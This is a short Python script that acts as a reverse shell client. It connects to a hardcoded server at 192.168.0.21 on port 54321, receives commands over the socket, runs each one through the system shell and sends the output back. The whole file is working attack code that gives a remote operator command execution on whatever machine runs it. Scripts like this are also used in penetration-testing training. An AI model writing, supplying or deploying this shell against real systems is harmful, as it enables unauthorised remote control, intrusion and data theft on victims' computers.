#!/usr/bin/python

import socket, subprocess, json

def reliable_send(data):
    json_data = json.dumps(str(data))
    sock.send(json_data.encode('UTF-8'))

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode('UTF-8')
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            print("Exiting.")
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

# Create IPv4 TCP object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to reverse shell server
sock.connect(("192.168.0.21", 54321))

shell()
sock.close()
